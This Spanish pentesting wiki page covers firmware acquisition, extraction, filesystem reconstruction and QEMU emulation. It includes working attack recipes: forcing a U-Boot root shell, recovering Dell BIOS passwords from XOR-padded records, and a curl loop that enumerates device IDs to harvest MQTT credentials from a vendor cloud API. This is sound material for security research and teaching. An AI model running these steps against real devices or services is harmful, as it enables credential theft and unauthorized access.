# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

Para adquirir firmware a través de interfaces de hardware expuestas, consulta [Extracción de firmware asistida por consola UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) y [Extracción de SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Para capturar de forma repetible la UART durante el arranque antes de acceder a la consola, consulta [Adquisición con alimentación controlada por SCPI y osciloscopio](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente, ya que gestiona y facilita la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones esenciales desde el momento en que se enciende y, así, iniciar el sistema operativo. Examinar y posiblemente modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Los detalles del bootloader
- La disposición del hardware y las hojas de datos
- Las métricas del codebase y las ubicaciones del código fuente
- Las bibliotecas externas y los tipos de licencia
- El historial de actualizaciones y las certificaciones reglamentarias
- Los diagramas de arquitectura y flujo
- Las evaluaciones de seguridad y las vulnerabilidades identificadas

Para este fin, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son muy valiosas, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [LGTM de Semmle](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para encontrar posibles problemas.

## **Obtención del firmware**

El firmware puede obtenerse de varias maneras, cada una con su propio nivel de complejidad:

- **Directamente** de la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** de sitios oficiales de soporte
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube** con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
- **Extrayéndolo** del dispositivo mediante conexiones como **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) o **PICit**
- **Capturando** solicitudes de actualización en las comunicaciones del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- **Volcando** el firmware desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, como último recurso, con las herramientas de hardware adecuadas

### Registros solo por UART: forzar un shell root mediante el entorno de U-Boot en flash

Si se ignora UART RX (solo hay registros), aún puedes forzar un shell de init **editando sin conexión el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Volcar la SPI flash con una pinza SOIC-8 y un programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición de entorno de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **recalcula el CRC32 del entorno de U-Boot** para el blob.
3. Reflashea solo la partición de entorno y reinicia; debería aparecer una shell en UART.

Esto resulta útil en dispositivos embebidos cuyo shell del bootloader está deshabilitado, pero cuya partición de entorno se puede escribir mediante acceso externo a la Flash.

### Divulgación de código protegido mediante una tarea de copia de Firewall

Algunos MCU permiten que el código de una aplicación desprotegida llame a una puerta de enlace de una región protegida, en lugar de leer directamente la Flash protegida. Tras obtener ejecución de código en la aplicación, inspecciona cada tarea de la puerta de enlace como una primitiva independiente de transferencia de memoria. En el caso de Cypherock X1, la puerta de enlace de llamada Firewall del STM32L4 aceptaba una tarea, un puntero externo `data`, una longitud y una `address` protegida. Una tarea de escritura no rechazaba un puntero de origen `data` que apuntara a código de Firewall. El caller no podía leer ese código directamente, pero la propia puerta de enlace podía copiarlo a almacenamiento no volátil protegido, que una tarea de lectura permitida podía exponer.<sup>[[15]](#references)</sup>

Para reproducir esta clase de divulgación, identifica una página de almacenamiento protegido que se pueda escribir y que tenga una tarea de lectura correspondiente, establece como origen de escritura direcciones sucesivas del código protegido y lee los bytes almacenados temporalmente. Comprueba el medio de almacenamiento antes de repetir las escrituras: en este caso era Flash, por lo que había que borrar la página antes de reutilizarla. Los investigadores usaron una rutina que borraba y restauraba el contenido válido de Secure Data Storage; después almacenaron temporalmente el código en el espacio libre restante, en lugar de sobrescribir los datos de la wallet. Esto requiere ejecución de código en el MCU y una puerta de enlace de llamada accesible; no es un bypass de lectura directo desde un host no autenticado.<sup>[[15]](#references)</sup>

El código recuperado puede revelar [brechas de confianza en las actualizaciones del firmware y la integridad del arranque](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Análisis del firmware

Ahora que **tienes el firmware**, debes extraer información sobre él para saber cómo tratarlo. Algunas herramientas que puedes usar para ello:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, probablemente esté cifrada (o comprimida de alguna forma).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Recursos gráficos sin procesar en la flash externa

Un volcado SPI externo no es necesariamente el firmware ejecutable del MCU. En un objetivo Cortex-M, compara el inicio de cada región de código candidata con el mapa de memoria del dispositivo: una tabla de vectores normal empieza con un puntero de pila SRAM plausible y una dirección del controlador de reinicio en memoria ejecutable. Que no haya una tabla de vectores en el desplazamiento cero no demuestra por sí solo que todo el chip carezca de código; inspecciona otros desplazamientos y la disposición del arranque. Si `binwalk` no encuentra ningún contenedor, inspecciona los bytes sin procesar y relaciona las direcciones de lectura de la flash con las acciones que cargan pantallas nuevas, usando una [captura SPI decodificada](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Para una región de recursos gráficos, prueba formatos de píxel y dimensiones posibles en lugar de dar por sentado que se trata de PNG/JPEG. El dispositivo citado usaba fotogramas **80×160 RGB565 little-endian**: a dos bytes por píxel, un fotograma ocupa **25,600 bytes** (25 KiB), no 24 kilobits. Una dirección de lectura de la flash decodificada permitió identificar el desplazamiento del recurso de pantalla; el investigador convirtió una imagen preparada con `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, reemplazó el recurso del mismo tamaño en el volcado original, lo escribió con `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` y confirmó que la nueva imagen aparecía en la pantalla. Esto demuestra que se pueden escribir *recursos gráficos externos*, no que se pueda extraer ni volver a grabar el firmware interno del MCU. Conserva el volcado original y verifica las dimensiones, el orden de bytes, el desplazamiento y la longitud del reemplazo antes de escribir.<sup>[[14]](#references)</sup>

### Análisis diferencial de la flash y almacenes de secretos XOR recuperables

Cuando un ajuste del firmware no tiene un formato de almacenamiento documentado, primero realiza varias lecturas coincidentes de la flash, cambia **exactamente un** ajuste, vuelve a volcar el chip completo y compara los desplazamientos. Repetir el experimento con valores controlados permite distinguir el ajuste de los contadores y los metadatos de escritura; los cambios en nuevos desplazamientos, en lugar de sobrescribir los datos existentes, indican un almacén de solo anexado o estructurado como un registro. Conserva las entradas eliminadas o marcadas como borradas, ya que sus bytes de carga útil podrían seguir siendo recuperables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After locating the region, extrae los módulos del firmware con herramientas como `binwalk` y analiza mediante ingeniería inversa el writer/validator en Ghidra. Confirma en el código los límites de los campos, el padding, la indexación de claves y la derivación de claves, en lugar de inferir el esquema únicamente a partir de patrones del ciphertext.<sup>[[12]](#references)</sup>

#### Recuperar claves a partir del padding cifrado con ceros

Como se describe en [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), el texto plano conocido revela bytes del keystream en los mismos offsets. Un campo de tamaño fijo es especialmente vulnerable cuando su padding de ceros abarca todos los índices de una clave XOR repetitiva: el padding cifrado revela directamente esos bytes de la clave porque `0x00 XOR key_byte = key_byte`. Si quedan cubiertos todos los índices de la clave, reconstruye la clave a partir de la cola del ciphertext y descifra los bytes con datos.<sup>[[12]](#references)</sup>

El formato DVAR de contraseña de BIOS vulnerable de Dell es un ejemplo concreto: el byte `0` de un campo de 32 bytes está en texto plano, mientras que los bytes `1..31` usan una clave repetitiva de 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para una longitud de contraseña `L`, las posiciones `L..31` eran cero antes de aplicar XOR. Cuando `L <= 12`, esas posiciones abarcan todos los índices de la clave, por lo que se recuperan la clave completa y la contraseña sin fuerza bruta:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraer claves de registros históricos

No analices cada registro por separado. La clave DVAR se deriva aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: la semilla del dispositivo y el GUID son fijos, y la única entrada que depende de la contraseña es el primer byte en claro. Esto da como máximo 256 claves por dispositivo, y los registros que comienzan con el mismo byte comparten una clave. Agrupa los registros activos y eliminados según ese byte; un registro histórico corto puede filtrar la clave completa mediante el padding y permitir descifrar un registro actual más largo cuyo padding no basta. Por tanto, rotar la contraseña puede aumentar la exposición si el texto cifrado antiguo se marca como eliminado en lugar de borrarse.<sup>[[12]](#references)</sup>

La herramienta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera contraseñas y puede mostrar los bytes almacenados/de clave sin procesar. Compílala desde un checkout y analiza una imagen flash verificada como se indica a continuación:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para parsers personalizados, rechaza los falsos positivos usando la estructura de los registros, restricciones de caracteres imprimibles, comprobaciones de relleno con ceros, entropía de la clave y coherencia cuando la clave se repite. Si varios dumps muestran cambios dispersos de bits por escritura, enumera las máscaras observadas y prioriza las correcciones según estas restricciones, pero indica los caracteres ambiguos en lugar de presentar un resultado heurístico como una recuperación exacta.<sup>[[12]](#references)</sup>

Los verificadores de contraseñas deben almacenar un hash unidireccional con salt e iteraciones, en lugar de texto cifrado reversible, y los almacenes con estructura de registro deben eliminar de forma segura el material secreto reemplazado.<sup>[[12]](#references)</sup>

### Obtener el sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta con el nombre del tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá los bytes mágicos del sistema de archivos en sus firmas**. En estos casos, usa binwalk para **encontrar el offset del sistema de archivos y extraer el sistema de archivos comprimido** del binario; luego, **extrae manualmente** el sistema de archivos según su tipo, siguiendo los pasos que se indican a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecute el siguiente **comando dd** para hacer carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstrucción de sistemas de archivos raíz integrados divididos

Si un volcado raw de eMMC/SSD contiene un encabezado de sistema de archivos válido, pero sus desplazamientos de metadatos se extienden más allá de la partición nominal, no lo clasifiques de inmediato como corrupto. El código de arranque integrado puede ensamblar el dispositivo raíz real a partir de varios rangos físicos con Device Mapper, por lo que extraer una sola partición GPT solo produce el primer segmento.<sup>[[9]](#references)</sup>

#### Clasifica todo el medio

Primero verifica que la adquisición haya terminado, que el tamaño sea estable y que ningún proceso de escritura siga usando la imagen. Si el nombre del archivo codifica una dirección inicial/final, compara ese rango con el número real de bytes. Recupera la GPT en modo de solo lectura y adjunta únicamente el rango necesario; **no** ejecutes `vgchange -ay` en un volumen físico no confiable de la estación de trabajo, ya que pueden producirse conflictos entre grupos de volúmenes y escrituras involuntarias.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Prefiere una VM desechable cuando la lógica original de `init` o una pila LVM necesite ver la imagen completa. Los registros históricos de arranque de una partición de arranque estándar son especialmente útiles: el bootloader puede haber registrado offsets de contenedores propietarios, longitudes de componentes, selección de slots, reglas de alineación y verificación de firmas. Usa esos valores para extraer una línea de comandos, un kernel y un initramfs integrados; luego valida cada salida por separado con `file`, bytes mágicos y `binwalk`. Leer hasta el final del contenedor puede añadir accidentalmente un initrd, un objeto ACPI o una firma al kernel.<sup>[[9]](#references)</sup>

#### Recuperar el mapa de bloques en el arranque

Extrae el initramfs del kernel y haz reverse engineering de su `/init` y de las bibliotecas de almacenamiento. En [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), sigue las referencias a cadenas de `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` y las rutas de las particiones; luego rastrea el código que selecciona el slot A/B activo y construye la tabla. Algunos puntos de partida útiles en radare2 son `r2 -A init`, `afl`, `pdf @ main` y `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

El target `linear` asigna rangos consecutivos de un dispositivo virtual a rangos de uno o más dispositivos subyacentes. Una tabla recuperada de dos segmentos suele tener esta forma (todas las posiciones y longitudes se expresan en sectores de 512 bytes):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduce exactamente la aritmética del código máquina, incluidos el ancho de los enteros, los desplazamientos y las conversiones de unidades. Por ejemplo, la siguiente expresión redondea hacia abajo el tamaño en bytes al límite de 4 KiB y solo entonces lo convierte a sectores de 512 bytes; reemplazarla por `p4_bytes // 512` desplaza el final seleccionado en `p4_bytes % 4096` cuando la partición no está alineada a página.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruye una imagen de análisis plana copiando los rangos en el orden de la tabla y usando bloques acotados, en lugar de cargar el volcado completo del medio en memoria. Esto también evita crear dispositivos mapper en el host. Mantén los offsets derivados de GPT, los recuentos de sectores invertidos y la longitud de salida resultante como aserciones independientes.<sup>[[9]](#references)</sup>

#### Distinguir la corrupción de un error de reconstrucción constante

Para SquashFS, comprueba el magic `hsqs` y decodifica el campo little-endian de 64 bits `bytes_used` en el offset 40 del superbloque antes de ejecutar `unsquashfs`. Si falla la extracción en varias estructuras no relacionadas, busca en una ventana amplia alrededor de las posiciones esperadas y exige candidatos estructurales sólidos: un bloque de metadatos descomprimible, varias entradas de directorio válidas consecutivas, campos de inode plausibles, un inode raíz coherente con el recuento de inodes o una estructura válida de metadatos de integridad. Una sola coincidencia de magic no es suficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Cuando el mismo delta con signo hace válidas estructuras independientes —por ejemplo, los metadatos de directorio y un registro de verity—, la causa probable es un error sistemático en el inicio del segmento, no la falta de bytes. Vuelve a revisar la aritmética inversa y busca restos descartados, problemas de signo, desbordamientos o redondeos a sectores/páginas antes de intentar recuperar archivos huérfanos o modificar los metadatos del sistema de archivos.<sup>[[9]](#references)</sup>

Por último, mantén separados los límites de protección: los volúmenes LUKS sellados con TPM protegen la confidencialidad de los datos, mientras que una asignación dm-verity firmada protege la integridad del sistema de archivos raíz. Un TPM de software no permite recuperar una clave sellada al TPM físico original, y arrancar un SquashFS modificado mediante un init de investigación que omite la verificación de verity no falsifica su firma ni vulnera dm-verity.<sup>[[9]](#references)</sup>

## Análisis de firmware

Una vez obtenido el firmware, es fundamental analizarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio con el nombre del tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos porque faltan magic bytes, es necesario extraerlo manualmente. Para ello, se usa `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se utilizan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas, los endpoints API, las funcionalidades de los servidores de actualización, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones** y los **elementos clave** que hay que inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios integrados para analizarlos más a fondo
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información confidencial y vulnerabilidades en el sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información confidencial
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para el análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse para detectar vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían ser explotados.

## Obtención de configuración cloud y credenciales MQTT mediante tokens derivados de URL

Muchos hubs IoT obtienen su configuración específica de cada dispositivo desde un endpoint cloud con este formato:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, puede que descubras que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extrae el deviceId de los registros de arranque UART

- Conecta un adaptador UART de 3,3 V (TX/RX/GND) y captura los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración de la nube y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token del firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar la configuración de cloud y las credenciales de MQTT

- Construye la URL y descarga el JSON con curl; analízalo con jq para extraer secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto claro y de ACL débiles de topics (si existen)

- Usa las credenciales recuperadas para suscribirte a los topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo predecibles (a gran escala, con autorización)

- Muchos ecosistemas incluyen bytes de OUI/producto/tipo del proveedor seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configs mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Cuando sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar desafíos relacionados con las dependencias de hardware o arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y endianidad, como una Raspberry Pi, o a una máquina virtual preconfigurada, puede facilitar pruebas adicionales.

### Emular binarios individuales

Para examinar programas individuales, es crucial identificar la endianidad y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario de arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se usa `qemu-mips`; para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm`.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

### Reconstrucción de sistemas de archivos raíz divididos y verificados para la emulación

Si se puede leer un superblock de SquashFS, pero los desplazamientos de las tablas de inodos, directorios o fragmentos son imposibles, no modifiques `unsquashfs` de inmediato. Haz ingeniería inversa del binario de arranque temprano y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición raíz nominal, pero construir el sistema de archivos real con un mapeo `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo examinan el superblock pueden ser correctas aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[11]](#references)</sup>

Preserva exactamente la aritmética del firmware. En particular, determina si las longitudes están expresadas en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos de bits y el truncamiento en su orden original; y ten en cuenta las regiones finales que dependen del banco en las distribuciones A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca a un límite de 4 KiB y solo entonces expresa el resultado en sectores de 512 bytes; sustituirlo por `partition_bytes // 512` puede desplazar la extensión añadida unos pocos kilobytes y corromper todas las tablas SquashFS posteriores.<sup>[[11]](#references)</sup>

Un flujo de validación útil es:<sup>[[11]](#references)</sup>

1. Recupera del binario del verificador/init el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear`.
2. Concatena o mapea las extensiones sin cambiar la semántica de alineación.
3. Si la extracción sigue fallando, busca únicamente en una ventana pequeña alrededor del límite previsto y exige varias estructuras de metadatos válidas consecutivas, en lugar de aceptar solo un superblock plausible.
4. Ejecuta `unsquashfs` sin modificar sobre la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una prueba más sólida que `unsquashfs -stat`.

#### Sustitución de dm-verity controlada por el analista

Cuando el analista controla el kernel QEMU, el initramfs y los discos virtuales, se puede arrancar con una raíz modificada sustituyendo el PID 1 de verificación del proveedor por un init pequeño enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en el laboratorio**, no un bypass de dm-verity, de su firma RSA, de Secure Boot ni de una clave sellada por TPM.<sup>[[11]](#references)</sup>

El init de reemplazo debe reproducir las partes operativas de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques suministrado, montar la raíz editada en modo de solo lectura, desmontar los pseud sistemas de archivos de la raíz anterior, mover el nuevo montaje a `/`, ejecutar `chroot` y llamar a `execve()` para iniciar el `/sbin/init` original del firmware. Desmontar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita desmontar accidentalmente puntos de montaje que pertenecen a la nueva raíz.<sup>[[11]](#references)</sup>

Mantén el estado mutable del dispositivo separado de la raíz inmutable modificada. Una superposición qcow2 puede preservar el estado LVM del disco original, mientras que un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de la imagen sin conexión

Inspecciona el estado persistente fuera del sistema invitado cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables dificulten identificar el fallo. Nunca conectes una imagen overlay que esté usando una VM en ejecución; expónla con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarla.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

